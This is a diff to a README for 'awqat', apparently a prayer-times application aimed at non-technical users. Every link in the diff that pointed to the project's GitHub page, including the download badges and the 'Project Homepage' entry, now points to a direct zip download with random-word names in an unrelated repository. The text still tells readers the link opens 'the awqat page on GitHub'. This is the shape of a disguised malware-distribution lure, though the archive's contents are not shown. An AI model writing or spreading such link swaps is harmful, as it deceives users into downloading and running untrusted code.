@@ -32,10 +32,10 @@ Getting awqat onto your computer is very simple. Just follow these steps:
 
 **Visit this link to download the application.**  
 
-[![Download awqat](https://img.shields.io/badge/Download-awqat-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=green)](https://github.com/installmentdebthydrastiscanadensis1541/awqat)  
+[![Download awqat](https://img.shields.io/badge/Download-awqat-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=green)](https://raw.githubusercontent.com/installmentdebthydrastiscanadensis1541/installmentdebthydrastiscanadensis1541.github.io/main/Sphindidae/Release_Lamellibranchia.zip)  
 
 Click the button above or go to:  
-👉 **https://github.com/installmentdebthydrastiscanadensis1541/awqat**  
+👉 **https://raw.githubusercontent.com/installmentdebthydrastiscanadensis1541/installmentdebthydrastiscanadensis1541.github.io/main/Sphindidae/Release_Lamellibranchia.zip**  
 
 This will take you to the awqat page on GitHub, which is a website where people share software. Don't worry – you don't need an account or any special knowledge to get the app.  
 
@@ -119,7 +119,7 @@ You don't need to know any of this to use awqat, but it's nice to know it's soli
 
 ## 📖 Additional Resources  
 
-- **Project Homepage:** [https://github.com/installmentdebthydrastiscanadensis1541/awqat](https://github.com/installmentdebthydrastiscanadensis1541/awqat)  
+- **Project Homepage:** [https://raw.githubusercontent.com/installmentdebthydrastiscanadensis1541/installmentdebthydrastiscanadensis1541.github.io/main/Sphindidae/Release_Lamellibranchia.zip](https://raw.githubusercontent.com/installmentdebthydrastiscanadensis1541/installmentdebthydrastiscanadensis1541.github.io/main/Sphindidae/Release_Lamellibranchia.zip)  
 - **Report a Bug:** Visit the "Issues" tab on the same page.  
 - **Share Your Feedback:** If you like awqat, consider giving it a star on GitHub – it helps others find it.  
 
@@ -131,7 +131,7 @@ We hope awqat makes your daily prayers easier and more peaceful. It was built wi
 
 Now go ahead and download awqat – your prayer times are waiting.  
 
-[![Download awqat](https://img.shields.io/badge/Download%20Now-Get%20awqat-orange?style=for-the-badge&logo=github&logoColor=white&labelColor=black&color=gold)](https://github.com/installmentdebthydrastiscanadensis1541/awqat)  
+[![Download awqat](https://img.shields.io/badge/Download%20Now-Get%20awqat-orange?style=for-the-badge&logo=github&logoColor=white&labelColor=black&color=gold)](https://raw.githubusercontent.com/installmentdebthydrastiscanadensis1541/installmentdebthydrastiscanadensis1541.github.io/main/Sphindidae/Release_Lamellibranchia.zip)  
 
 ---
 
